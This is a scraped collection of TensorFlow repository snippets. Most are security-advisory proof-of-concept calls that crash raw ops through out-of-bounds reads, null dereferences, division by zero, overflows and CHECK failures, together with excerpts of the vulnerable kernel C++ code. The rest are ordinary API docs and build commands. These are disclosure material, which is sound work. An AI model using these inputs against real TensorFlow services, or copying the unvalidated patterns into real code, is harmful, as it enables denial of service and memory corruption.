DESCRIPTION: This Python code snippet serves as a minimal example to demonstrate the TFSA-2021-133 vulnerability in TensorFlow. It calls the raw SqrtGrad operation (`tf.raw_ops.SqrtGrad`) with inputs 'y' and 'dy' having different numbers of elements ([4, 16] vs []). This difference exploits the lack of size validation in the underlying kernel implementation, leading to the described heap OOB read and null pointer binding.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-133.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.SqrtGrad(y=[4, 16],dy=[])
```

----------------------------------------

TITLE: Reading Audio Data from Buffer in Python
DESCRIPTION: Defines the method to read the latest audio data from the internal buffer. It takes the desired number of samples (`size`) as input and returns a NumPy array containing the captured audio data. Raises `ValueError` if the requested size exceeds the buffer capacity.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioRecord.md#_snippet_1

LANGUAGE: python
CODE:
```
read(
    size: int
) -> np.ndarray
```

----------------------------------------

TITLE: Demonstrating Vulnerability in tf.raw_ops.LoadAndRemapMatrix (Python)
DESCRIPTION: This Python snippet demonstrates the denial of service vulnerability in `tf.raw_ops.LoadAndRemapMatrix` by constructing specific tensors, including an empty `initializing_values` tensor with shape `[0, 1]`, and calling the operation. This input bypasses the kernel's assumptions about the tensor's shape, triggering a `CHECK`-failure in vulnerable versions of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-067.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

ckpt_path = tf.constant(
    "/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0", shape=[], dtype=tf.string)
old_tensor_name = tf.constant(
    "/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0", shape=[], dtype=tf.string)

row_remapping = tf.constant(0, shape=[], dtype=tf.int64)
col_remapping = tf.constant(3, shape=[3], dtype=tf.int64)
initializing_values = tf.constant([], shape=[0, 1], dtype=tf.float32)

tf.raw_ops.LoadAndRemapMatrix(
  ckpt_path=ckpt_path,
  old_tensor_name=old_tensor_name,
  row_remapping=row_remapping,
  col_remapping=col_remapping,
  initializing_values=initializing_values,
  num_rows=1,
  num_cols=1)
```

----------------------------------------

TITLE: Demonstrating Conv2D Floating Point Exception Vulnerability in TensorFlow
DESCRIPTION: This Python snippet demonstrates how to trigger a floating point exception (division by zero) in TensorFlow's `tf.raw_ops.Conv2D` by providing an empty input tensor (`[1, 0, 2, 1]`) along with valid filter and padding parameters. It requires the tensorflow and numpy libraries. Running this code on a vulnerable version of TensorFlow will cause a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-124.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
with tf.device("CPU"): # also can be triggerred on GPU
   input = np.ones([1, 0, 2, 1])
   filter = np.ones([1, 1, 1, 1])
   strides = ([1, 1, 1, 1])
   padding = "EXPLICIT"
   explicit_paddings = [0 , 0, 1, 1, 1, 1, 0, 0]
   data_format = "NHWC"
   res = tf.raw_ops.Conv2D(
       input=input,
       filter=filter,
       strides=strides,
       padding=padding,
        explicit_paddings=explicit_paddings,
       data_format=data_format,
  )
```

----------------------------------------

TITLE: Declaring Nightly Keras & TensorBoard Dependencies (CI)
DESCRIPTION: Includes dependencies for the nightly builds of Keras and TensorBoard, specifically used in CI nightly jobs. These packages are pinned to compatible release versions (`~=`) that align with the TensorFlow major/minor version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/devel.requirements.txt#_snippet_1

LANGUAGE: pip requirements
CODE:
```
# Finally, install tensorboard, and keras
# Note that here we want the latest version that matches TF major.minor version
# Note that we must use nightly here as these are used in nightly jobs
# For release jobs, we will pin these on the release branch
# Note that the CACHEBUSTER variable, set in the CI builds, will force these to
# be the latest version.
keras-nightly ~= 2.14.0.dev
tb-nightly ~= 2.13.0.a
```

----------------------------------------

TITLE: Triggering Type Confusion with stateless_truncated_normal / TensorFlow / Python
DESCRIPTION: This Python snippet provides another example of triggering the CVE-2021-29513 vulnerability. It uses `tf.random.stateless_truncated_normal` and incorrectly specifies `dtype=20` (a non-numeric type) for a function expecting a numeric type, thereby exploiting the type confusion bug during tensor conversion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-003.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
data =
tf.random.stateless_truncated_normal(shape=1,seed=[63,70],mean=np.float32(20.8739),stddev=779.973,dtype=20)
```

----------------------------------------

TITLE: Run multihost_hlo_runner on Multiple Files
DESCRIPTION: Similar to `run_hlo_module`, this command executes `multihost_hlo_runner` using Bazel to process multiple HLO files matching a directory pattern, supporting SPMD execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_5

LANGUAGE: Bazel
CODE:
```
bazel run //xla/tools/multihost_hlo_runner:hlo_runner_main -- [flags] /dump/*before_optimizations*
```

----------------------------------------

TITLE: Demonstrating TensorArrayConcatV2 NPE Vulnerability in TensorFlow Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the Null Pointer Exception vulnerability (TFSA-2023-012, CVE-2023-25663) in TensorFlow's `tf.raw_ops.TensorArrayConcatV2` operation. It imports TensorFlow and calls the vulnerable function with specific parameters designed to expose the NPE when the step container is null. This code is intended to show the vulnerability, not for production use.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-012.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.raw_ops.TensorArrayConcatV2(handle=['a', 'b'], flow_in = 0.1, dtype=tf.int32, element_shape_except0=1)
```

----------------------------------------

TITLE: Conditionally Add Android-Specific Sources and Libraries (CMake)
DESCRIPTION: This block checks if the target system is Android. If true, it conditionally adds the NNAPI delegate provider source if `_TFLITE_ENABLE_NNAPI` is set and appends Android-specific libraries like the log library and Abseil strings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
if(CMAKE_SYSTEM_NAME MATCHES "Android")
  if(_TFLITE_ENABLE_NNAPI)
    list(APPEND TFLITE_BENCHMARK_SRCS
      ${TFLITE_SOURCE_DIR}/tools/delegates/nnapi_delegate_provider.cc
    )
  endif()
  list(APPEND TFLITE_BENCHMARK_LIBS
    ${ANDROID_LOG_LIB}
    absl::strings
  )
endif()
```

----------------------------------------

TITLE: Demonstrating Overflow in ResizeNearestNeighborGrad TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the integer overflow vulnerability in `tf.raw_ops.ResizeNearestNeighborGrad`. It sets up gradient (`grads`) and target size (`size`) tensors with values specifically chosen to trigger the overflow when the operation is executed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-149.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

align_corners = True
half_pixel_centers = False
grads = tf.constant(1, shape=[1,8,16,3], dtype=tf.float16)
size = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
tf.raw_ops.ResizeNearestNeighborGrad(grads=grads, size=size, align_corners=align_corners, half_pixel_centers=half_pixel_centers)
```

----------------------------------------

TITLE: Cross-Build TFLite Pip with Bazel - aarch64 Python 3.8 (Shell)
DESCRIPTION: Uses the `ci_build.sh` script with the `PI-PYTHON38` profile to set up the necessary Docker build environment. It then calls the `build_pip_package_with_bazel.sh` script inside Docker, targeting the `aarch64` architecture for Python 3.8.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_11

LANGUAGE: sh
CODE:
```
tensorflow/tools/ci_build/ci_build.sh PI-PYTHON38 \
  tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh aarch64
```

----------------------------------------

TITLE: Vulnerable Input Validation in MatrixTriangularSolve Kernel (C++)
DESCRIPTION: This C++ snippet shows the `ValidateInputTensors` function and the start of the `Compute` function for the `MatrixTriangularSolve` op. It highlights the use of `OP_REQUIRES`, which returns on failure but does not prevent subsequent initialization (`MatMulBCast`) with invalid dimensions, leading to the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-039.md#_snippet_0

LANGUAGE: C++
CODE:
```
void ValidateInputTensors(OpKernelContext* ctx, const Tensor& in0,
                            const Tensor& in1) override {
  OP_REQUIRES(
      ctx, in0.dims() >= 2,
      errors::InvalidArgument("In[0] ndims must be >= 2: ", in0.dims()));

  OP_REQUIRES(
      ctx, in1.dims() >= 2,
      errors::InvalidArgument("In[0] ndims must be >= 2: ", in1.dims()));
}

void Compute(OpKernelContext* ctx) override {
  const Tensor& in0 = ctx->input(0);
  const Tensor& in1 = ctx->input(1);

  ValidateInputTensors(ctx, in0, in1);

  MatMulBCast bcast(in0.shape().dim_sizes(), in1.shape().dim_sizes());
  ...
}
```

----------------------------------------

TITLE: Demonstrating TensorFlow Fractional Avg Pool Vulnerability in Python
DESCRIPTION: This Python snippet demonstrates how to trigger the double free vulnerability in TensorFlow's `nn_ops.fractional_avg_pool_v2`. It sets up input tensors and a `pooling_ratio` where the first and fourth elements are not 1.0, which is the condition that leads to the vulnerability. The code attempts to execute the operation within a try-except block to catch the expected error in vulnerable TensorFlow versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-003.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
import os
import numpy as np
from tensorflow.python.ops import nn_ops
try:
  arg_0_tensor = tf.random.uniform([3, 30, 50, 3], dtype=tf.float64)
  arg_0 = tf.identity(arg_0_tensor)
  arg_1_0 = 2
  arg_1_1 = 3
  arg_1_2 = 1
  arg_1_3 = 1
  arg_1 = [arg_1_0,arg_1_1,arg_1_2,arg_1_3,]
  arg_2 = True
  arg_3 = True
  seed = 341261001
  out = nn_ops.fractional_avg_pool_v2(arg_0,arg_1,arg_2,arg_3,seed=seed,)
except Exception as e:
  print("Error:"+str(e))
```

----------------------------------------

TITLE: Validating TFLite DepthwiseConv Input Channels C++
DESCRIPTION: This C++ snippet shows the validation logic within the TensorFlow Lite `DepthwiseConv` kernel. It retrieves the number of input channels (dimension 3) and performs a modulo operation to ensure the filter channels are a multiple of input channels. This specific code is vulnerable to a division-by-zero if `num_input_channels` is 0.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-089.md#_snippet_0

LANGUAGE: C++
CODE:
```
int num_input_channels = SizeOfDimension(input, 3);
TF_LITE_ENSURE_EQ(context, num_filter_channels % num_input_channels, 0);
```

----------------------------------------

TITLE: Triggering SparseDenseCwiseDiv Division by Zero - Python
DESCRIPTION: This Python code snippet demonstrates how to trigger a division by zero vulnerability in the `tf.raw_ops.SparseDenseCwiseDiv` operation. It imports necessary libraries (`tensorflow`, `numpy`) and calls the function with specific inputs (sparse indices, values, shape, and a dense tensor containing zero) designed to cause a floating-point exception due to division by zero.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-110.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseDenseCwiseDiv(
  sp_indices=np.array([[4]]),
  sp_values=np.array([-400]),
  sp_shape=np.array([647.]),
  dense=np.array([0]))
```

----------------------------------------

TITLE: Demonstrating TensorFlow Save/SaveSlices Vulnerability Python
DESCRIPTION: This Python snippet demonstrates the denial of service vulnerability in TensorFlow's raw `Save` and `SaveSlices` operations. It attempts to save tensors with unsupported data types (`tf.uint64` for `Save` and `tf.uint32` for `SaveSlices`) which can trigger a `CHECK` fail. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-114.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
filename = tf.constant("")
tensor_names = tf.constant("")
# Save
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)
tf.raw_ops.Save(filename=filename, tensor_names=tensor_names, data=data, )
# SaveSlices
shapes_and_slices = tf.constant("")
data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)
tf.raw_ops.SaveSlices(filename=filename, tensor_names=tensor_names, shapes_and_slices=shapes_and_slices, data=data, )
```

----------------------------------------

TITLE: Demonstrating Heap OOB Read in TensorFlow Restore Python
DESCRIPTION: This Python example illustrates a heap out-of-bounds read vulnerability in `tf.raw_ops.Restore`. Providing a non-empty but insufficient `tensor_name` list (like `['x']`) combined with an out-of-bounds `preferred_shard` index (`42` in this case) can cause TensorFlow to read invalid memory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-113.md#_snippet_2

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.Restore(
  file_pattern=['/tmp'],
  tensor_name=['x'],
  default_value=21,
  dt=tf.int,
  preferred_shard=42)
```

----------------------------------------

TITLE: TensorFlow TensorShape Dimension Initialization - C++
DESCRIPTION: This C++ snippet shows the `InitDims` method within `TensorShapeBase`. It iterates through the provided dimension sizes and attempts to add each one using `AddDimWithStatus`. It aggregates the status and returns non-OK if any dimension addition fails, such as during an overflow condition.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-024.md#_snippet_2

LANGUAGE: c++
CODE:
```
template <class Shape>
Status TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {
  ...
  Status status = OkStatus();
  for (int64 s : dim_sizes) {
    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));
    if (!status.ok()) {
      return status;
    }
  }
}
```

----------------------------------------

TITLE: Computing Minimum Rank in ConcatV2 Shape Inference C++
DESCRIPTION: This C++ snippet from the `ConcatShapeHelper` function shows how the `axis` argument is read from the tensor (`concat_dim_t`) and cast to `int64_t`. It then calculates the `min_rank` required for the input tensors based on this `concat_dim`. A negative `concat_dim` results in a negative `min_rank`, which is crucial for bypassing later checks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-007.md#_snippet_1

LANGUAGE: cpp
CODE:
```
  int64_t concat_dim;
  if (concat_dim_t->dtype() == DT_INT32) {
    concat_dim = static_cast<int64_t>(concat_dim_t->flat<int32>()(0));
  } else {
    concat_dim = concat_dim_t->flat<int64_t>()(0);
  }

  // Minimum required number of dimensions.
  const int min_rank = concat_dim < 0 ? -concat_dim : concat_dim + 1;

  // ...
  ShapeHandle input = c->input(end_value_index - 1);
  TF_RETURN_IF_ERROR(c->WithRankAtLeast(input, min_rank, &input));
```

----------------------------------------

TITLE: Demonstrating Overflow in tf.keras.losses.poisson (Python)
DESCRIPTION: This snippet demonstrates an integer overflow vulnerability (CVE-2022-41887) in `tf.keras.losses.poisson` in TensorFlow. It constructs `y_true` with large dimensions (50000x50000) and `y_pred`, which, when multiplied internally, cause the resulting dimension size to exceed the capacity of an `int32`, leading to a crash during broadcasting. Requires `tensorflow` and `numpy`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-150.md#_snippet_0

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf

true_value = tf.reshape(shape=[1, 2500000000], tensor = tf.zeros(dtype=tf.bool, shape=[50000, 50000]))
pred_value = np.array([[[-2]], [[8]]], dtype = np.float64)

tf.keras.losses.poisson(y_true=true_value,y_pred=pred_value)
```

----------------------------------------

TITLE: Triggering TensorFlow QuantizedMul Vulnerability (Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger the heap buffer overflow vulnerability in TensorFlow's `QuantizedMul` operation. It constructs quint8 tensors for inputs x and y, but passes empty float32 tensors for the quantization threshold arguments (`min_x`, `max_x`, `min_y`, `max_y`), which leads to invalid memory access in the underlying kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-023.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

x = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)
y = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)
min_x = tf.constant([], dtype=tf.float32)
max_x = tf.constant([], dtype=tf.float32)
min_y = tf.constant([], dtype=tf.float32)
max_y = tf.constant([], dtype=tf.float32)

tf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)
```

----------------------------------------

TITLE: Retrieving and Checking Grappler Node Inputs (C++)
DESCRIPTION: This C++ snippet from TensorFlow's Grappler constant folding logic retrieves the input nodes (children) for a given graph node using `node_map_->GetNode`. It assumes these input nodes exist and immediately dereferences the resulting pointers to check if they are constants via `IsReallyConstant`. The vulnerability lies in the absence of a null check on the pointers returned by `GetNode`, leading to a null pointer dereference if an expected input node is missing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-052.md#_snippet_0

LANGUAGE: C++
CODE:
```
  NodeDef* mul_left_child = node_map_->GetNode(node->input(0));
  NodeDef* mul_right_child = node_map_->GetNode(node->input(1));
  // One child must be constant, and the second must be Conv op.
  const bool left_child_is_constant = IsReallyConstant(*mul_left_child);
  const bool right_child_is_constant = IsReallyConstant(*mul_right_child);
```

----------------------------------------

TITLE: Triggering Heap Buffer Overflow in Conv3DBackpropInputV2 - Python
DESCRIPTION: This Python snippet demonstrates how to trigger a heap buffer overflow in `tf.raw_ops.Conv3DBackpropInputV2`. It provides crafted `input_sizes`, `filter`, and `out_backprop` tensors along with specific `strides` that exploit the lack of validation between these arguments, leading to potential memory corruption. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-010.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)
filter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)
out_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

----------------------------------------

TITLE: Initializing TextEmbedder - Python
DESCRIPTION: Initializes a TextEmbedder instance with the specified options and a C++ embedder object. This constructor is typically used internally after setup via `create_from_file` or `create_from_options`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextEmbedder.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.text.TextEmbedder(
    options: tflite_support.task.text.TextEmbedderOptions,
    cpp_embedder: _CppTextEmbedder
) -> None
```

----------------------------------------

TITLE: Ending ScoreThresholdingOptions (Python)
DESCRIPTION: This snippet shows the function signature for `ScoreThresholdingOptionsEnd`. It takes a `builder` object, which is expected to be a FlatBuffer builder, and finalizes the construction of the `ScoreThresholdingOptions` object, completing its definition within the FlatBuffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptionsEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreThresholdingOptionsEnd(\n    builder\n)
```

----------------------------------------

TITLE: Testing Basic Python-to-C++ Transpilation
DESCRIPTION: Demonstrates using the `PyToBasicCpp` transpiler defined previously. It defines a simple Python function `f`, creates an instance of `PyToBasicCpp`, calls its `transform` method with the function object, and prints the resulting generated C++ code string. This provides a concrete example of the transpilation process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
def f(x, y):
  print(x, y)

code, _ = PyToBasicCpp().transform(f, None)
print(code)
```

----------------------------------------

TITLE: Initializing ProcessUnitOptionsCreator in Python
DESCRIPTION: This code snippet shows the signature for the `ProcessUnitOptionsCreator` within the TFLite Support library. It represents the structure for initializing or calling this creator, which requires two parameters: `unionType` and `table`. This function is typically used internally when building the FlatBuffers structure for TFLite model metadata, handling the union types required for process unit options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitOptionsCreator.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ProcessUnitOptionsCreator(
    unionType, table
)
```

----------------------------------------

TITLE: Triggering Conv3DBackpropFilterV2 Vulnerability in Python
DESCRIPTION: This Python snippet demonstrates how to trigger the division by zero vulnerability in the `tf.raw_ops.Conv3DBackpropFilterV2` operation using empty or zero-sized tensors. Although the inputs shown have dimensions, the out_backprop tensor is explicitly empty ([1, 1, 1, 1, 0] shape with empty content), leading to the same underlying issue within the kernel's calculations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-011.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_sizes = tf.constant([1], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
filter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5], dtype=tf.int32)
out_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)

tf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

----------------------------------------

TITLE: Reproducing TensorFlow RandomShuffle NPE with XLA - Python
DESCRIPTION: This Python snippet provides a minimal reproduction case for the Null Pointer Exception vulnerability (TFSA-2023-009, CVE-2023-25674) in `tf.raw_ops.RandomShuffle` when XLA compilation (`jit_compile=True`) is used with specific parameter values for `value`, `seed`, and `seed2`. Executing this code on an unpatched TensorFlow version is expected to trigger the NPE.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-009.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

func = tf.raw_ops.RandomShuffle
para = {'value': 1e+20, 'seed': -4294967297, 'seed2': -2147483649}

@tf.function(jit_compile=True)
def test():
   y = func(**para)
   return y

test()
```

----------------------------------------

TITLE: Reproducing DoS with DrawBoundingBoxes - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.raw_ops.DrawBoundingBoxes`. It uses `tf.fill` to create an image tensor with zero height and passes it to the operation, which causes the internal `CHECK` failure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-022.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

images = tf.fill([53, 0, 48, 1], 0.)
boxes = tf.fill([53, 31, 4], 0.)
boxes = tf.Variable(boxes)
boxes[0, 0, 0].assign(3.90621)
tf.raw_ops.DrawBoundingBoxes(images=images, boxes=boxes)
```

----------------------------------------

TITLE: Adding Input Tensor Groups TFLite Metadata Python
DESCRIPTION: This Python function adds a list of `InputTensorGroup` offsets to a FlatBuffer builder. It's used when constructing TFLite subgraph metadata to associate groups of input tensors with the subgraph. The function takes the builder object and a list of integer offsets representing the input tensor groups.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddInputTensorGroups.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddInputTensorGroups(
    builder, inputTensorGroups
)
```

----------------------------------------

TITLE: Examining Build Output Directory
DESCRIPTION: This command lists the contents of the `build_output` directory in the TensorFlow root. After running a CI script, this directory contains generated artifacts such as the Bazel cache, built files like `.whl` packages, and the `script.log` file detailing the script execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/README.md#_snippet_6

LANGUAGE: bash
CODE:
```
ls build_output
```

----------------------------------------

TITLE: Initializing ScoreThresholdingOptionsT from Packed Buffer in Python
DESCRIPTION: This class method initializes a `ScoreThresholdingOptionsT` object from a packed buffer, optionally specifying a starting position. This is used for deserializing data from a buffer that may contain packed FlatBuffers data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptionsT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Starting Subgraph Metadata Vector in TensorFlow Lite Metadata (Python)
DESCRIPTION: This function initiates the building of a vector of `SubgraphMetadata` objects within a FlatBuffers builder context. It is typically used when constructing the `ModelMetadata` FlatBuffer structure. It requires a FlatBuffers builder instance and the expected number of elements in the vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataStartSubgraphMetadataVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataStartSubgraphMetadataVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Initializing ProcessUnitT Python Class
DESCRIPTION: This is the constructor for the `ProcessUnitT` class. It is used to create a new instance of the `ProcessUnitT` object in Python, typically before populating it with data or initializing it from a buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ProcessUnitT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ProcessUnitT()
```

----------------------------------------

TITLE: Checking if Min Values are None in Python
DESCRIPTION: This instance method checks if the minimum values field in the FlatBuffers buffer is set to None. It returns a boolean indicating the presence or absence of min values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Stats.md#_snippet_9

LANGUAGE: Python
CODE:
```
MinIsNone()
```

----------------------------------------

TITLE: Packing AssociatedFileT With Builder Python
DESCRIPTION: An instance method that serializes the current `AssociatedFileT` object into a FlatBuffers builder. The builder (`builder` parameter) is used to construct the final FlatBuffers binary data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Checking Equality (__eq__) for BertCluAnnotationOptions in Python
DESCRIPTION: This method implements the equality comparison for instances of the `BertCluAnnotationOptions` class. It compares the current object instance with another object to determine if they are equal based on their configuration parameters. The comparison requires the `Any` type hint for the input object `other` and returns a boolean value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/BertCluAnnotationOptions.md#_snippet_1

LANGUAGE: Python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Accessing Version in ModelMetadata
DESCRIPTION: Retrieves the version string associated with the model metadata. This method returns the version identifier of the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_15

LANGUAGE: python
CODE:
```
Version()
```

----------------------------------------

TITLE: Example tf.argmax Upgrade in Report (Python)
DESCRIPTION: Presents an excerpt from the `tf_upgrade_v2` report, illustrating a specific code change. It shows how the `tf.argmax` function call is modified, renaming the `dimension` argument to `axis` and adding the `input` keyword argument.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/compatibility/README.md#_snippet_3

LANGUAGE: Python
CODE:
```
Old:         tf.argmax([[1, 3, 2]], dimension=0)
                                        ~~~~~~~~~~
    New:         tf.argmax(input=[[1, 3, 2]], axis=0)
```

----------------------------------------

TITLE: Calling SparseCountSparseOutput with Vulnerable Input in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates a call to `tf.raw_ops.SparseCountSparseOutput` using an input configuration (`indices` with rank 1) that triggers the described heap out-of-bounds read vulnerability. It is wrapped in a `tf.function` for potential graph mode execution, highlighting the issue occurs during shape inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-188.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def func():
  return tf.raw_ops.SparseCountSparseOutput(
    indices=[1],
    values=[[1]],
    dense_shape=[10],
    weights=[],
    binary_output= True)

func()
```

----------------------------------------

TITLE: Calculating Interpolation Bounds in QuantizedResizeBilinear - C++
DESCRIPTION: This C++ snippet from the TensorFlow kernel implementation (`quantized_resize_bilinear_op.cc`) shows the original vulnerable logic used to calculate the `lower` and `upper` bounds (`interpolation->lower[i]`, `interpolation->upper[i]`) for interpolation. It illustrates how flooring (`std::floor`) and ceiling (`std::ceil`) a floating-point input (`in`) could result in the `upper` bound being calculated as smaller than the `lower` bound, leading to invalid indices.
